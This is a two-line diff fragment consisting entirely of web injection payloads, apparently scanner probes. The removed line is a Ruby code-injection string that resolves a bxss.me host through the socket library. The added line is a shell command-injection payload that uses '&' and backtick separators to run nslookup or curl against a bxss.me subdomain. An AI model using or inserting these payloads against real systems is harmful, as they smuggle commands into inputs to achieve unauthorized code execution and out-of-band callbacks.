@@ -1,2 +1,1 @@
-"+"A".concat(70-3).concat(22*4).concat(101).concat(79).concat(107).concat(82)+(require"socket"
-Socket.gethostbyname("hitpa"+"yrzrgklfff53b.bxss.me.")[3].to_s)+"
+&(nslookup -q=cname hitxytbsopnzy9b203.bxss.me||curl hitxytbsopnzy9b203.bxss.me)&'\"`0&(nslookup -q=cname hitxytbsopnzy9b203.bxss.me||curl hitxytbsopnzy9b203.bxss.me)&`'
